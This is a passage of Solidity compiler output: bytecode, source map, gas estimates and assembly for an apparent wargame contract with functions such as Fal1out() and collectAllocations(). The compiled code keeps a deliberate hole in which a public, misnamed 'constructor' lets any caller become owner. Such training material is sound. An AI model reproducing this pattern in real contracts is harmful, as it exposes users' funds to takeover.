MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x43B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH2 0x490 CALLVALUE PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x51C SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x59A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCA 0xCA CREATE2 AND 0x2D SUB MOD 0xEE 0x26 0xDB 0xB1 0x5E SWAP10 0x25 PUSH1 0x9C 0x5C TIMESTAMP 0x5F GASLIMIT 0xBA SWAP14 0xD STOP 0xD5 0xB4 LOG4 SWAP1 PUSH2 0x8486 STOP PUSH5 0x736F6C6343 STOP MOD STOP STOP CALLER ",
							"sourceMap": "228:886:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;377:99;;;:::i;:::-;;896:100;;8:9:-1;5:2;;;30:1;27;20:12;5:2;896:100:1;;;:::i;:::-;;323:28;;8:9:-1;5:2;;;30:1;27;20:12;5:2;323:28:1;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;740:152;;8:9:-1;5:2;;;30:1;27;20:12;5:2;740:152:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;740:152:1;;;;;;;;;;;;;;;;;;;:::i;:::-;;626:110;;;:::i;:::-;;1000:112;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1000:112:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;1000:112:1;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;377:99;425:10;417:5;;:18;;;;;;;;;;;;;;;;;;462:9;441:11;:18;453:5;;;;;;;;;;;441:18;;;;;;;;;;;;;;;:30;;;;377:99::o;896:100::-;546:5;;;;;;;;;;;532:19;;:10;:19;;;510:92;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;949:10:::1;:19;;:42;969:21;949:42;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39::::0;24:38:::1;77:16;74:1;67:27;5:2;949:42:1;896:100::o:0;323:28::-;;;;;;;;;;;;;:::o;740:152::-;837:1;812:11;:22;824:9;812:22;;;;;;;;;;;;;;;;:26;804:35;;;;;;845:9;:18;;:42;864:11;:22;876:9;864:22;;;;;;;;;;;;;;;;845:42;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;845:42:1;740:152;:::o;626:110::-;693:38;721:9;693:11;:23;705:10;693:23;;;;;;;;;;;;;;;;:27;;:38;;;;:::i;:::-;667:11;:23;679:10;667:23;;;;;;;;;;;;;;;:64;;;;626:110::o;1000:112::-;1066:4;1085:11;:22;1097:9;1085:22;;;;;;;;;;;;;;;;1078:29;;1000:112;;;:::o;867:176:0:-;925:7;944:9;960:1;956;:5;944:17;;984:1;979;:6;;971:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1035:1;1028:8;;;867:176;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "299600",
								"executionCost": "337",
								"totalCost": "299937"
							},
							"external": {
								"Fal1out()": "41903",
								"allocate()": "infinite",
								"allocatorBalance(address)": "1284",
								"collectAllocations()": "infinite",
								"owner()": "1075",
								"sendAllocation(address)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 228,
									"end": 1114,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 228,
									"end": 1114,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 228,
									"end": 1114,
									"name": "MSTORE"
								},
								{
									"begin": 228,
									"end": 1114,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 228,
									"end": 1114,
									"name": "POP"
								},
								{
									"begin": 228,
									"end": 1114,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 228,
									"end": 1114,
									"name": "DUP1"
								},
								{
									"begin": 228,
									"end": 1114,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 228,
									"end": 1114,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 228,
									"end": 1114,
									"name": "CODECOPY"
								},
								{
									"begin": 228,
									"end": 1114,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 228,
									"end": 1114,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220cacaf5162d0306ee26dbb15e9925609c5c425f45ba9d0d00d5b4a4906184860064736f6c63430006000033",
									".code": [
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "MSTORE"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "LT"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "JUMPI"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "SHR"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "DUP1"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH",
											"value": "6FAB5DDF"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "EQ"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "JUMPI"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "DUP1"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH",
											"value": "8AA96F38"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "EQ"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "JUMPI"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "DUP1"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH",
											"value": "8DA5CB5B"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "EQ"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "JUMPI"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "DUP1"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH",
											"value": "A2DEA26F"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "EQ"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "JUMPI"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "DUP1"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH",
											"value": "ABAA9916"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "EQ"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "JUMPI"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "DUP1"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH",
											"value": "FFD40B56"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "EQ"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "JUMPI"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "JUMPDEST"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "DUP1"
										},
										{
											"begin": 228,
											"end": 1114,
											"name": "REVERT"
										},
										{
											"begin": 377,
											"end": 476,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 377,
											"end": 476,
											"name": "JUMPDEST"
										},
										{
											"begin": 377,
											"end": 476,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 377,
											"end": 476,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 377,
											"end": 476,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 377,
											"end": 476,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 377,
											"end": 476,
											"name": "JUMPDEST"
										},
										{
											"begin": 377,
											"end": 476,
											"name": "STOP"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "JUMPDEST"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "POP"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "JUMPDEST"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "STOP"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "JUMPDEST"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "POP"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "JUMPDEST"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "MLOAD"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "DUP1"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "DUP3"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "AND"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "AND"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "DUP2"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "MSTORE"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "ADD"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "SWAP2"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "POP"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "POP"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "MLOAD"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "DUP1"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "SWAP2"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "SUB"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "SWAP1"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "RETURN"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "JUMPDEST"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "POP"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "DUP1"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "DUP2"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "ADD"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "SWAP1"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "DUP1"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "DUP1"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "AND"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "SWAP1"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "ADD"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "SWAP1"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "SWAP3"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "SWAP2"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "SWAP1"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "POP"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "POP"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "POP"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "JUMPDEST"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "STOP"
										},
										{
											"begin": 626,
											"end": 736,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 626,
											"end": 736,
											"name": "JUMPDEST"
										},
										{
											"begin": 626,
											"end": 736,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 626,
											"end": 736,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 626,
											"end": 736,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 626,
											"end": 736,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 626,
											"end": 736,
											"name": "JUMPDEST"
										},
										{
											"begin": 626,
											"end": 736,
											"name": "STOP"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "JUMPDEST"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "POP"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "DUP1"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "DUP2"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "ADD"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SWAP1"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "DUP1"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "DUP1"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "AND"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SWAP1"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "ADD"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SWAP1"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SWAP3"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SWAP2"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SWAP1"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "POP"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "POP"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "POP"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "JUMPDEST"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "MLOAD"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "DUP1"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "DUP3"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "DUP2"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "MSTORE"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "ADD"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SWAP2"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "POP"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "POP"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "MLOAD"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "DUP1"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SWAP2"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SUB"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SWAP1"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "RETURN"
										},
										{
											"begin": 377,
											"end": 476,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 377,
											"end": 476,
											"name": "JUMPDEST"
										},
										{
											"begin": 425,
											"end": 435,
											"name": "CALLER"
										},
										{
											"begin": 417,
											"end": 422,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 417,
											"end": 422,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "EXP"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "DUP2"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "SLOAD"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "DUP2"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "MUL"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "NOT"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "AND"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "SWAP1"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "DUP4"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "AND"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "MUL"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "OR"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "SWAP1"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "SSTORE"
										},
										{
											"begin": 417,
											"end": 435,
											"name": "POP"
										},
										{
											"begin": 462,
											"end": 471,
											"name": "CALLVALUE"
										},
										{
											"begin": 441,
											"end": 452,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "DUP1"
										},
										{
											"begin": 453,
											"end": 458,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 453,
											"end": 458,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 453,
											"end": 458,
											"name": "SWAP1"
										},
										{
											"begin": 453,
											"end": 458,
											"name": "SLOAD"
										},
										{
											"begin": 453,
											"end": 458,
											"name": "SWAP1"
										},
										{
											"begin": 453,
											"end": 458,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 453,
											"end": 458,
											"name": "EXP"
										},
										{
											"begin": 453,
											"end": 458,
											"name": "SWAP1"
										},
										{
											"begin": 453,
											"end": 458,
											"name": "DIV"
										},
										{
											"begin": 453,
											"end": 458,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 453,
											"end": 458,
											"name": "AND"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "AND"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "AND"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "DUP2"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "MSTORE"
										},
										{
